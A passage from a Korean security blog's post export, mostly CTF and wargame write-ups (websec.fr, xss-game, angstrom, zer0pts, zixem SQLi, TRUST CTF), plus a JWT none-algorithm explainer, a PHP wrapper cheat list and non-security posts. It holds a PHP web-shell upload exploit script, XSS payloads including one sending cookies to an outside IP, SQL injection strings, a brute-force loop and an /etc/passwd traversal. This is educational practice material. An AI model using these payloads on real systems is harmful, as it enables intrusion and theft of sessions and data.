isset($_GET[&#39;filename&#39;]) ) &#123; $filename = $_GET[&#39;filename&#39;]; if ($_GET[&#39;p&#39;] === &quot;edit&quot;) &#123; $p = &quot;edit&quot;; if (isset($_POST[&#39;data&#39;])) &#123; $data = $_POST[&#39;data&#39;]; if (strpos($data, &#39;&lt;?&#39;) === false &amp;&amp; stripos($data, &#39;script&#39;) === false) &#123; # no interpretable code please. file_put_contents($_GET[&#39;filename&#39;], $data); die (&#39;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=.&quot;&gt;&#39;); &#125; &#125; elseif (file_exists($_GET[&#39;filename&#39;]))&#123; $data = file_get_contents($_GET[&#39;filename&#39;]); &#125; &#125; &#125; ?&gt; 파일 업로드 문제이다. 웹 쉘을 업로드 해서 간단히 문제를 해결할 수 있지만, 파일 내용에 &lt;? 이 못들어가도록 php 코드 실행을 허술(?) 하게 막고 있다. 이는 php wrapper인 base64 en/decode 방식을 사용하면 된다. #!/usr/bin/python3 #import requests import requests import base64 filename = &#39;shell.php&#39; def session(sess): url = sess.get(&#39;https://websec.fr/level24/index.php&#39;) session_key = url.cookies.get_dict()[&#39;PHPSESSID&#39;] return session_key def shell(): return &quot;&lt;?php echo file_get_contents(&#39;../../flag.php&#39;); ?&gt;&quot;.encode(&#39;base64&#39;) def exploit(sess): payload = &#39;php://filter/convert.base64-decode/resource=&#39;+filename url = &#39;https://websec.fr/level24/index.php?p=edit&amp;filename=&#39;+payload data = &#123;&#39;filename&#39;: payload, &#39;data&#39;: shell()&#125; req = sess.post(url, data=data) def execute(sess, session_key): url = &#39;https://websec.fr/level24/uploads/&#39;+session_key+&#39;/&#39;+filename r = sess.get(url) print url print r.text def main(): sess = requests.Session() session_key = session(sess) exploit(sess) execute(sess, session_key) main() 세션값이 실행 시마다 변경되기 때문에 같은 방법으로 실행 때 마다 새 세션을 구해줘야 하는데, 이 부분에서 세션키를 얻는 과정이 갑자기 생각안나서 한 2시간 잡고있었던 것 같다.. 풀면서 느낀거지만, 파이썬 언어 연습좀 더 해야겠다.","categories":[{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/categories/Wargame/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"websec.fr","slug":"websec-fr","permalink":"https://blog.jhyeon.dev/tags/websec-fr/"},{"name":"Writeup","slug":"Writeup","permalink":"https://blog.jhyeon.dev/tags/Writeup/"}]},{"title":"BOB 8기 서류 & 면접 후기","slug":"bob8th-200510","date":"2020-05-09T15:00:00.000Z","updated":"2020-05-09T15:00:00.000Z","comments":true,"path":"2020/05/10/bob8th-200510/","link":"","permalink":"https://blog.jhyeon.dev/2020/05/10/bob8th-200510/","excerpt":"","text":"올해도 bob 9기 교육생 모집이 시작되었습니다..!! 이번에도 기회가 주어진 만큼 열심히 준비하고 꼭 붙고 싶은 마음 뿐입니다..! 9기 이전에 저는 8기 때도 bob에 교육생으로 지원하게 되었습니다. 체계적인 교육 과정과 프로젝트 등.. 제가 생각하는 bob는 기대 그 이상으로 좋은 프로그램이라고 생각하고 있습니다. 지금도 그렇구요 먼저 서류에 대해서 약간 후기를 남겨봅니다. 자기소개서 본인이 이룬 성과 및 사례 지원동기 합격후 포부 관심 분야 학업 계휙 진로 계휙 전반적으로 위 7가지 항목에 대해서 내가 어떤 사람이고, 보안에 어떻게 관심을 가졌는지, 지금까지 어떤 활동을 해왔는지 등에 대해서 상세적으로 풀어서 작성하였습니다.. 정확히 어떤 내용을 작성해야 하는지는 이제 본인이 직접 하나씩 트리를 정리해보면서 작성해보시는 것을 권유드립니다. 일단 서류도 보면 경쟁률이 어마어마 하기 때문에 절대! 모든 항목에 대해 소홀히 쓰시면 안되고 어필할 수 있는 것을 모두 짧고 굵게 어필 해야 한다고 생각이 듭니다 ㅎㅎ.. 앗! 또한 서류 작성하실 때 거짓된 내용, 자기가 한것처럼 꾸미는 내용, 아는척(?) 에 대해서 글을 쓰시면 안됩니다. 멘토님들이 서류를 하나하나 모두 검토하시기 때문에 서류는 붙을 수 있어도 면접에서 다 들통나게 됩니다.. (거짓된 내용 쓸려는 생각 자체가 잘못된거죠 사실,,) 서류 지원 기간은 약 한달 정도 있었는데 여차저차 하면서 사실 촉박하게 준비한 것은 맞습니다 그럼에도 불구하고 운 좋게 서류 합격 통보를 받았고 면접까지 갈 수 있는 기회가 생기게 되면서 저는 조금 기뻤지만, 감격도 잠시.. 저는 앞에 말했듯이 너무 촉박하게 준비한 탓에 프로젝트를 뭘 해야할까도 생각해야 했고 여러 무거운 관문앞에 서 있었습니다.. (사실 여기서 내가 지금 준비된게 맞을까? ) 이런 생각도 들었지만 그래도 기회가 주어진 만큼 최선을 다하자고 다짐하면서 제가 하고 싶은 프로젝트를 주제로 준비하였습니다 일단 면접을 볼때 면접대기실 분위기 자체는 괜찮았습니다. (사람 마다 느끼는건 다르지만) 멘토님 3명, 지원자 3명 이렇게 면접장에 들어가 3:3 면접을 보았는데 와.. 면접장에 들어가는 순간부터 정말 무거운 분위기가 저를 반겨주더군요,, 엄청나게 긴장하였습니다.. 그 탓인지 아는 것도 재대로 답을 하지 못했고 말을 얼버무렸습니다.. 감점요소가 제일 큰 부분이 아닐까 싶습니다. 일단 들어가면 PT 발표를 진행하게 되는데 발표 시간은 3분 이였습니다. 즉 임팩트 있게 중요한 내용만 넣어서 발표를 해야한다는 뜻이고 시간을 넘어도 끊지는 않으십니다 시간이 넘었다고 해서 당황할 필요는 없을 것 같습니다. 사실 여기까지만 보면 제가 준비 기간이 넉넉했음에도 재대로 준비를 안했던 것이 비중이 큽니다 그래도 부족한 저를 면접까지 볼 수 있는 기회를 주셨고,, 끝까지 면접 봐주신 멘토님들에게 감사 인사를 드리고 싶습니다. 결과로는 불합격을 하였지만 이번에 9기에도 지원할 수 있는 기회가 생겼으니 이번에는 꼼꼼하게 미리 잘 준비하여 기회를 잡고 싶은 심정이네요,,","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"BoB","slug":"BoB","permalink":"https://blog.jhyeon.dev/tags/BoB/"}]},{"title":"(ko) Docker Language Setting","slug":"dockerset-200422","date":"2020-04-21T15:00:00.000Z","updated":"2020-04-21T15:00:00.000Z","comments":true,"path":"2020/04/22/dockerset-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/dockerset-200422/","excerpt":"","text":"1. 설정 변경 사항sudo apt-get install locales export LANGUAGE=ko_KR.UTF-8 export LANG=ko_KR.UTF-8 source ~/.bashrc locale-gen ko_KR ko_KR.UTF-8 update-locale LANG=ko_KR.UTF-8 dpkg-reconfigure locales 근데 한글화가 필요하면, 도커 빌드 때 미리 해두는게 솔직히 편하다.. 그래서 아래에 도커 빌드 설정도 첨부해보려 한다. Dockerfile RUN apt-get install language-pack-ko -y RUN apt-get install fonts-nanum -y RUN apt-get install fonts-nanum-coding -y RUN locale-gen ko_KR.UTF-8 ENV LANG ko_KR.UTF-8 ENV LANGUAGE ko_KR.UTF-8 ENV LC_ALL ko_KR.UTF-8","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://blog.jhyeon.dev/tags/Docker/"},{"name":"Dockerfile","slug":"Dockerfile","permalink":"https://blog.jhyeon.dev/tags/Dockerfile/"}]},{"title":"JWT None Type Injection","slug":"jwtinjection-200422","date":"2020-04-21T15:00:00.000Z","updated":"2020-04-21T15:00:00.000Z","comments":true,"path":"2020/04/22/jwtinjection-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/jwtinjection-200422/","excerpt":"","text":"1. JWT(JSON WEB TOKEN)JWT(JSON WEB TOKEN) 란, 정보를 안전하게 전송하기 위해 개발된 RFC 7519 의 웹 표준 입니다. JSON 객체를 통해 “self-contained” 방식으로 데이터를 전송합니다. 2. JWT TOKENJWT는 아래와 같은 형태를 가지고 있고, Header, Signature, Payload 3개의 부분으로 나뉘어져 있고 이는 .(dot) 으로 구분됩니다. eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiamh5ZW9uIn0.QmGHY7ZS7SmWSy_VFr93F342f1jIEAv_WuK_gHKbyL8 헤더(Header) 에는 alg(암호화 알고리즘), typ(token type) 값이 들어가게 됩니다. &#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot; &#125; 두번째 부분인 페이로드(Payload) 부분에는 토큰의 클레임(Claim) 즉, 객체나 데이터 값이 들어가게 됩니다. &#123; &quot;name&quot;: &quot;jhyeon&quot; &#125; 세번째는 서명(Signature)가 들어갑니다. 서명에는 암호 알고리즘에 대한 정보가 들어가는데, 이러한 서명은 중간자에 의해 변조되지 않았다는 걸 증명 또는 검증하기 위해 사용합니다. HMACSHA256( base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret) 위와 같이 세가지 부분을 각각 BASE64 인코딩을 통하여 JWT 토큰 값으로 사용하게 됩니다. 3. How to JWT None Type Attack?JWT None Type Attack 란, JWT 토큰의 헤더 부분 alg(암호화 알고리즘) 을 조작함으로써 발생하는 공격입니다. &#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot; &#125; 일반적인 JWT 토큰에 대한 암호화 알고리즘은 HS256과 같이 형태를 가지고 있는데, 이 알고리즘을 “None” 타입으로 변조하여 Signature(검증) 부분을 우회할 수 있게 되므로, \b잘못된 방법으로 JWT 토큰을 사용한다면 취약점이 발생할 수 있습니다. 따라서, 알고리즘을 조작하여 JWT 토큰을 변조하지 못하도록 토큰 생성시에 임의의 secret-key 를 사용하는 것이 안전합니다. 참고 : https://jwt.io","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"JWT","slug":"JWT","permalink":"https://blog.jhyeon.dev/tags/JWT/"}]},{"title":"php wrapper","slug":"phpwrapper-200422","date":"2020-04-21T15:00:00.000Z","updated":"2020-04-21T15:00:00.000Z","comments":true,"path":"2020/04/22/phpwrapper-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/phpwrapper-200422/","excerpt":"","text":"expect:// expect://ls php:filter php://filter/convert.base64-encode/resource=index.php zip:// zip://filename.zip#webshell.php data:// data://text/plain;base64,&#123;RCE CODE HERE&#125; php://input echo base64_encode(file_get_contents(&quot;filename&quot;));","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://blog.jhyeon.dev/tags/PHP/"}]},{"title":"Mprotect Exploitation","slug":"pwn-mprotect-200422","date":"2020-04-21T15:00:00.000Z","updated":"2020-04-21T15:00:00.000Z","comments":true,"path":"2020/04/22/pwn-mprotect-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/pwn-mprotect-200422/","excerpt":"","text":"1. 참고 링크(Notion) Notion : https://www.notion.so/jhyeon/MProtect-Exploitation-4443676548a149f4b5468e22b7374301","categories":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://blog.jhyeon.dev/tags/Pwn/"},{"name":"Mprotect","slug":"Mprotect","permalink":"https://blog.jhyeon.dev/tags/Mprotect/"},{"name":"Shellcode","slug":"Shellcode","permalink":"https://blog.jhyeon.dev/tags/Shellcode/"},{"name":"Exploitation","slug":"Exploitation","permalink":"https://blog.jhyeon.dev/tags/Exploitation/"}]},{"title":"xss game Write up","slug":"xssgame-200422","date":"2020-04-21T15:00:00.000Z","updated":"2020-04-21T15:00:00.000Z","comments":true,"path":"2020/04/22/xssgame-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/xssgame-200422/","excerpt":"","text":"홈페이지 : https://xss-game.appspot.com/ 1. LEVEL-1&lt;svg onload=alert(1)&gt; 2. LEVEL-2&lt;img src=&quot;#&quot; onerror=alert(1)&gt; onerror 이벤트 핸들러로 alert를 띄워줄 수 있다. 3. LEVEL-3 &lt;script&gt; function chooseTab(num) &#123; // Dynamically load the appropriate image. var html = &quot;Image &quot; + parseInt(num) + &quot;&lt;br&gt;&quot;; html += &quot;&lt;img src=&#39;/static/level3/cloud&quot; + num + &quot;.jpg&#39; /&gt;&quot;; $(&#39;#tabContent&#39;).html(html); window.location.hash = num; // Select the current tab var tabs = document.querySelectorAll(&#39;.tab&#39;); for (var i = 0; i &lt; tabs.length; i++) &#123; if (tabs[i].id == &quot;tab&quot; + parseInt(num)) &#123; tabs[i].className = &quot;tab active&quot;; &#125; else &#123; tabs[i].className = &quot;tab&quot;; &#125; &#125; // Tell parent we&#39;ve changed the tab top.postMessage(self.location.toString(), &quot;*&quot;); &#125; window.onload = function() &#123; chooseTab(unescape(self.location.hash.substr(1)) || &quot;1&quot;); &#125; // Extra code so that we can communicate with the parent page window.addEventListener(&quot;message&quot;, function(event)&#123; if (event.source == parent) &#123; chooseTab(unescape(self.location.hash.substr(1))); &#125; &#125;, false); &lt;/script&gt; &lt;img src=&#39;/static/level3/cloud&quot; + num + &quot;.jpg&#39; /&gt; chooseTab 함수가 호출될 때, 위와 같이 img 태그를 사용하고 있다. 여기서 onerror event handler 사용할려면 #framenum.jpg’ onerror=~ 와 같이 페이로드를 완성해주면 된다. frame#4.jpg&#39; onerror=alert(1)&gt; 4. LEVEL-4 &lt;script&gt; function startTimer(seconds) &#123; seconds = parseInt(seconds) || 3; setTimeout(function() &#123; window.confirm(&quot;Time is up!&quot;); window.history.back(); &#125;, seconds * 1000); &#125; &lt;/script&gt; &lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;&#123;&#123; timer &#125;&#125;&#39;);&quot; /&gt; 타이머 호출 스크립트이다, 그냥 입력한 숫자만큼 타이머가 돌아가는 구조라서 딱히 건드릴 부분은 없다. 하지만, 위 부분을 보면 onload event handler 로 스크립트를 실행하고 있다. 즉, onload 부분을 이용해서 alert를 띄워주면 된다. timer=1&#39;);alert(&#39;1 5. LEVEL-5&lt;body id=&quot;level5&quot;&gt; Welcome! Today we are announcing the much anticipated&lt;br&gt;&lt;br&gt; &lt;img src=&quot;/static/logos/level5.png&quot; /&gt;&lt;br&gt;&lt;br&gt; &lt;a href=&quot;/level5/frame/signup?next=confirm&quot;&gt;Sign up&lt;/a&gt; for an exclusive Beta. &lt;/body&gt; welcome.html 에서 sign up 페이지로 넘어가는 과정을 보면 ?next= 파라미터에 confirm 값을 담아서 a 태그로 페이지를 넘긴다. 여기서 보면 get 방식으로 값이 넘어오기 때문에 next= 에 대한 값을 바꿀 수 있게 된다. 즉, href 속성 값의 next= 파라미터의 값을 통해 alert 팝업을 실행해야 하는데, a 태그에서의 javascript 실행은 다음과 같이 구성된다. javascript:alert(1) 그래서 next=javascript:alert(1) 를 입력해주면 next 버튼을 클릭했을 때 자바스크립트 팝업창이 실행된다. 6. LEVEL-6&lt;script&gt; function setInnerText(element, value) &#123; if (element.innerText) &#123; element.innerText = value; &#125; else &#123; element.textContent = value; &#125; &#125; function includeGadget(url) &#123; var scriptEl = document.createElement(&#39;script&#39;); // This will totally prevent us from loading evil URLs! if (url.match(/^https?:\\/\\//)) &#123; setInnerText(document.getElementById(&quot;log&quot;), &quot;Sorry, cannot load a URL containing \\&quot;http\\&quot;.&quot;); return; &#125; // Load this awesome gadget scriptEl.src = url; // Show log messages scriptEl.onload = function() &#123; setInnerText(document.getElementById(&quot;log&quot;), &quot;Loaded gadget from &quot; + url); &#125; scriptEl.onerror = function() &#123; setInnerText(document.getElementById(&quot;log&quot;), &quot;Couldn&#39;t load gadget from &quot; + url); &#125; document.head.appendChild(scriptEl); &#125; // Take the value after # and use it as the gadget filename. function getGadgetName() &#123; return window.location.hash.substr(1) || &quot;/static/gadget.js&quot;; &#125; includeGadget(getGadgetName()); // Extra code so that we can communicate with the parent page window.addEventListener(&quot;message&quot;, function(event)&#123; if (event.source == parent) &#123; includeGadget(getGadgetName()); &#125; &#125;, false); &lt;/script&gt; 마지막 문제이다, 전체적인 코드가 좀 긴데 보면은 url.match 로 https 값이 있는지 검증해서 필터링한다. 그렇다고 http를 넣어서 하면은 http를 포함할 수 없다고 오류 메세지를 친절하게 반환해준다. &lt;script src=&quot;값&quot;&gt;&lt;/script&gt; 위 조건을 통과하고 나면 script를 호출하게 되는데 위와 같이 실행된다. 문제의 의도대로 풀려면 힌트에서 주어지는 google api 를 통해서 보면 되는데, https ://google.com/jsapi?callback=foo 여기서 함수 호출 과정을 보니 callback 파리미터로 넘어온 변수를 실행시켜주고 있다. 그렇기에 callback 파라미터로 alert를 날려주면 alert(); 이 실행될 것 이다. #Https://google.com/jsapi?callback=alert ALL CLEAR","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://blog.jhyeon.dev/tags/XSS/"},{"name":"Writeup","slug":"Writeup","permalink":"https://blog.jhyeon.dev/tags/Writeup/"}]},{"title":"angstorm ctf 2020 Write up","slug":"angstormctf-200410","date":"2020-04-09T15:00:00.000Z","updated":"2020-04-09T15:00:00.000Z","comments":true,"path":"2020/04/10/angstormctf-200410/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/10/angstormctf-200410/","excerpt":"","text":"1. [WEB - The Magic Word]&lt;script&gt; var msg = document.getElementById(&quot;magic&quot;); setInterval(function() &#123; if (magic.innerText == &quot;please give flag&quot;) &#123; fetch(&quot;/flag?msg=&quot; + encodeURIComponent(msg.innerText)) .then(res =&gt; res.text()) .then(txt =&gt; magic.innerText = txt.split``.map(v =&gt; String.fromCharCode(v.charCodeAt(0) ^ 0xf)).join``); &#125; &#125;, 1000); &lt;/script&gt; magic 텍스트의 값을 please give flag 으로 바꿔주면 된다. 2. [WEB - Xmas Still Stands]문제 내 post 기능에서 xss 취약점이 발생한다. 글을 써놓고 report 기능을 통해 게시글 번호를 전송해주면 봇이 내 글에 방문하기 때문에 리다이렉션으로 돌려놓고 포트 열고 대기하면 쿠키값이 날아오는데 날아오는 쿠키값으로 페이지 내 쿠키를 다시 세팅해주고 /admin 으로 접속하면 된다. &lt;img src=&quot;#&quot; onerror=this.src=&#39;https://IP:9999/?cookie=&#39;+document.cookie/&gt; GET /?c=super_secret_admin_cookie=hello_yes_i_am_admin;%20admin_name=Jamie HTTP/1.1-&gt; super_secret_admin_cookie=hello_yes_i_am_admin 3. [WEB - Consolation]&lt;button onclick=&quot;nofret()&quot; style=&quot;height:150px; width:150px;&quot;&gt;pay me some money&lt;/button&gt; 먼저 이 버튼을 누르면 nofret() 라는 함수를 호출 시키는데 이 함수를 따라가면 다음과 같다. function nofret()&#123;document[_0x4229(&#39;0x95&#39;,&#39;kY1#&#39;)](_0x4229(&#39;0x9&#39;,&#39;kY1#&#39;))[_0x4229(&#39;0x32&#39;,&#39;yblQ&#39;)]=parseInt(document[_0x4229(&#39;0x5e&#39;,&#39;xtR2&#39;)](_0x4229(&#39;0x2d&#39;,&#39;uCq1&#39;))[&#39;innerHTML&#39;])+0x19;console[_0x4229(&#39;0x14&#39;,&#39;70CK&#39;)](_0x4229(&#39;0x38&#39;,&#39;rwU*&#39;));console[&#39;clear&#39;]();&#125; [_0x4229(‘0x95’,’kY1#’)] 이 값을 chrome console 에서 실행시키면 어떤 값인지 알 수 있다. (getelementbyid) 순서대로 콘솔에 실행시켜보면 결과적으로, 0x4229(‘0x38’,’rwU*’) 이 값이 FLAG 를 가지고 있고, 콘솔에서 실행시키면 플래그를 얻을 수 있다. 4. [WEB - Git Good]아무것도 없는 Hello world 출력만 된 페이지이다, 문제의 이름 답게 /.git/ 을 통해 repository 저장소를 다운로드 할 수 있다. git clone https://gitgood.2020.chall.actf.co/.git/ 해당 저장소를 다운받아서 보면, thisistheflag.txt 라는 파일이 있는데 아무것도 없다, 그래서 커밋된 정보를 확인하기 위해 git show 를 해보면, 플래그가 있다. --- a/thisistheflag.txt +++ b/thisistheflag.txt @@ -1,3 +1 @@ -actf&#123;b3_car3ful_wh4t_y0u_s3rve_wi7h&#125; 5. [WEB - Secret Agents]처음엔 고민좀 해보다가 user-agent injection 을 통해서 문제를 풀 수 있었다. user-agent 값에 ‘ or ‘1’ = ‘1# 과 같이 injection 을 하나씩 해주고 사이트에 들어가보면 오류 메세지가 각각 다르게 반환되는 것을 볼 수 있다. 결과적으로 ‘ or ‘1’ = ‘1’ limit 2,1# 를 user-agent 값에 주입 하면 플래그가 있는 페이지를 볼 수 있다.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"}]},{"title":"zer0pts 2020 Write up","slug":"zer0ptsctf-200410","date":"2020-04-09T15:00:00.000Z","updated":"2020-04-09T15:00:00.000Z","comments":true,"path":"2020/04/10/zer0ptsctf-200410/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/10/zer0ptsctf-200410/","excerpt":"","text":"1. [web] can you guess it?(338 pt)&lt;?php include &#39;config.php&#39;; // FLAG is defined in config.php if (preg_match(&#39;/config\\.php\\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123; exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;); &#125; if (isset($_GET[&#39;source&#39;])) &#123; highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;])); exit(); &#125; $secret = bin2hex(random_bytes(64)); if (isset($_POST[&#39;guess&#39;])) &#123; $guess = (string) $_POST[&#39;guess&#39;]; if (hash_equals($secret, $guess)) &#123; $message = &#39;Congratulations! The flag is: &#39; . FLAG; &#125; else &#123; $message = &#39;Wrong.&#39;; &#125; &#125; ?&gt; if (isset($_GET[&#39;source&#39;])) &#123; highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;])); exit(); &#125; 해당 부분을 보면 PHP_SELF 인자를 이용해서 다른 경로의 파일을 읽어올 수 있다. &lt;?php if (preg_match(&#39;/config\\.php\\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123; exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;); &#125; config.php 파일에 flag가 있기 때문에 이 파일을 읽어주면 되는데, 정규식 표현으로 입력값 필터링을 하고 있다. 그런데 php 에서 basename 함수는 문자 \\x80 ~ xff 까지의 범위는 무시하기 때문에 적절하게 이용할 수 있다면 필터링 우회가 가능하다. index.php/config.php/%80?source 2. [web] music blog(653 pt)&lt;?php // (snipped) const flag = &#39;zer0pts&#123;&lt;censored&gt;&#125;&#39;; // (snipped) const crawl = async (url) =&gt; &#123; console.log(`[+] Query! ($&#123;url&#125;)`); const page = await browser.newPage(); try &#123; await page.setUserAgent(flag); await page.goto(url, &#123; waitUntil: &#39;networkidle0&#39;, timeout: 10 * 1000, &#125;); await page.click(&#39;#like&#39;); &#125; catch (err)&#123; console.log(err); &#125; await page.close(); console.log(`[+] Done! ($&#123;url&#125;)`) &#125;; 문제에 보면 게시글을 올릴 수 있는 기능이 있다. 그리고 worker.js 파일을 보면 봇이 쿠키를 가지고 있음을 알 수 있다. 그럼 두가지를 요약해서 보면 봇이 내 게시글을 읽어서 봇의 쿠키를 빼돌려야 한다. &lt;section&gt; &lt;div class=&quot;container&quot;&gt; &lt;h1 class=&quot;mt-4&quot;&gt; &lt;?php if ($post[&#39;published&#39;] === &#39;0&#39;) &#123; ?&gt;&lt;span class=&quot;badge badge-secondary&quot;&gt;Secret&lt;/span&gt;&lt;?php &#125; ?&gt; &lt;?= $post[&#39;title&#39;] ?&gt; &lt;/h1&gt; &lt;span class=&quot;text-muted&quot;&gt;by &lt;?= $post[&#39;username&#39;] ?&gt; &lt;span class=&quot;badge badge-love badge-pill&quot;&gt;♥ &lt;?= $post[&#39;likes&#39;] ?&gt;&lt;/span&gt;&lt;/span&gt; &lt;div class=&quot;mt-3&quot;&gt; &lt;?= render_tags($post[&#39;content&#39;]) ?&gt; &lt;/div&gt; &lt;div class=&quot;mt-3&quot;&gt; &lt;a href=&quot;like.php?id=&lt;?= $post[&#39;id&#39;] ?&gt;&quot; id=&quot;like&quot; class=&quot;btn btn-love&quot;&gt;♥ Like this post&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/section&gt; 게시글을 올리면 제목, 내용 그리고 like(좋아요?) 같은 버튼이 만들어 진다. 로직을 보면 봇이 like 버튼을 눌러주고 도망가는 구조이기 때문에 이 like 버튼을 누를 때 리다이렉션을 시켜서 서버로 플래그가 날아오게 하면 될 것 같다. function render_tags($str) &#123; $str = preg_replace(&#39;/\\[\\[(.+?)\\]\\]/&#39;, &#39;&lt;audio controls src=&quot;\\\\1&quot;&gt;&lt;/audio&gt;&#39;, $str); $str = strip_tags($str, &#39;&lt;audio&gt;&#39;); // only allows `&lt;audio&gt;` return $str; &#125; 하지만 입력값 필터링이 걸려 있다. 그런데 strip_tags 함수를 사용하는데 이 함수에서 /(slash) 를 사용하면 audio -&gt; a/udio -&gt; a 태그로 만들어 낼 수 있다. 즉, 태그를 만들어 주고 like 클릭 이벤트를 다른 서버로 돌려서 플래그를 탈취하면 된다. &lt;a/udio href=&#39;myip.kr:12345&#39; id=&#39;like&#39;&gt;like","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"}]},{"title":"zixem challenge Write up","slug":"zixemchall-200410","date":"2020-04-09T15:00:00.000Z","updated":"2020-04-09T15:00:00.000Z","comments":true,"path":"2020/04/10/zixemchall-200410/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/10/zixemchall-200410/","excerpt":"","text":"Site : https://www.zixem.altervista.org/SQLi/ 1. LEVEL-1id=0%20union%20select%201,version(),3;--%20- 2. LEVEL-2showprofile=0%27%20union%20select%201,2,version(),4;--%20- 3. LEVEL-3item=0%27%20unionon%20select%201,2,version(),4;--%20- 4. LEVEL-4ebookid=0%27%20union%20select%201,2,3,version(),5;--%20- 5. LEVEL-5#!/usr/bin/python import requests for i in range(0,2000): param = &quot;http://www.zixem.altervista.org/SQLi/login_do.php?pass=&quot;+str(i) r = requests.get(param) print param if &quot;Brute Force&quot; in r.text: print &quot;found key: &quot; + str(i) break 6. LEVEL-6serial=0%20and%201=1%20union%20select%20id,teacher,teacher_age,price%20from%20teachers%20%20where%20id=11%23 7. LEVEL-7id=0%20union%20select%201,version(),3;--%20- 8. LEVEL-8id=0%09union%09seselectlect%091,version(),3;--%09- 9. LEVEL-90%27%20union%20select%20&quot;../etc/passwd&quot;,2;--%20- 10. LEVEL-10 php uuencode -&gt; base64 encode x=PywiIVU7RkVPO0IhUzk2UUU4VzBALDJRVjk3KVM6Nl1OKiJEWysyVEArMGBgCmAK ALL CLEAR","categories":[{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/categories/Wargame/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"}]},{"title":"TRUST CTF 2019 Write up","slug":"trustctf-200223","date":"2020-02-22T15:00:00.000Z","updated":"2020-02-22T15:00:00.000Z","comments":true,"path":"2020/02/23/trustctf-200223/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/23/trustctf-200223/","excerpt":"","text":"1. (web) ezrc&lt;?php session_start(); include &#39;config.php&#39;; ?&gt; &lt;?php if(!isset($_SESSION[&#39;id&#39;]))&#123; header(&#39;Location: ./login.html&#39;); exit; &#125; ?&gt; &lt;a href=&quot;source.php&quot;&gt;&lt;button&gt;source code&lt;/button&gt;&lt;br/&gt;&lt;/a&gt; &lt;?php $id = $_SESSION[&#39;id&#39;]; $res = mysqli_query($con, &quot;select pw from ezrc where id=&#39;$id&#39;&quot;); $idx = mysqli_fetch_array($res); $pw = $idx[&#39;pw&#39;]; $print_query = &quot;select chk from ezrc where id=&#39;$id&#39;&quot;; $hehe_query = &quot;update ezrc set chk=&#39;$hehe&#39; where id=&#39;$id&#39;&quot;; $reset_query = &quot;update ezrc set chk=&#39;nope&#39; where id=&#39;$id&#39;&quot;; echo &quot;&lt;a href=logout.php&gt;logout&lt;/a&gt;&lt;br/&gt;&quot;; echo &quot;your id is &quot;.$id.&quot;&lt;br/&gt;&quot;; if(preg_match(&quot;/(tata|dada|zaza)+[a-z]&#123;3&#125;+coco?hehe/&quot;, $_GET[&#39;key&#39;]) &amp;&amp; strlen($_GET[&#39;key&#39;])&gt;30)&#123; $res = mysqli_query($con, $print_query); $idx = mysqli_fetch_array($res); echo &quot;your chk is &quot;.$idx[&#39;chk&#39;].&quot;&lt;br/&gt;&quot;; if($idx[&#39;chk&#39;] == $hehe)&#123; echo $flag.&quot;&lt;br/&gt;&quot;; mysqli_query($con, $reset_query); exit(&quot;congratulations&quot;); &#125; &#125; mysqli_query($con, $hehe_query); $str = &quot;trust_is_very_cooool&quot;; $t = (int)$_GET[&#39;times&#39;]; if($pw == md5(240610708))&#123; echo &quot;pw right&quot;; for($i=0; $i&lt;$t; $i=$i+1)&#123; for($j=0; $j&lt;$t; $j=$j+1)&#123; $str = md5($str); &#125; &#125; if($str == &quot;d91a2796ab967c9793ef1c628a91fac5&quot;)&#123; echo $flag; &#125; else&#123; mysqli_query($con, $reset_query); &#125; &#125; else&#123; mysqli_query($con, $reset_query); &#125; ?&gt; 레이스 컨디션(race condition) 을 이용하는 문제이다. 서로 다른 브라우저(세션) 을 가지고 동시에 요청하면 다른 한 브라우저에서 플래그를 넘겨준다. CTF에서 레이스 컨디션을 사용한 문제를 본 것이 조금 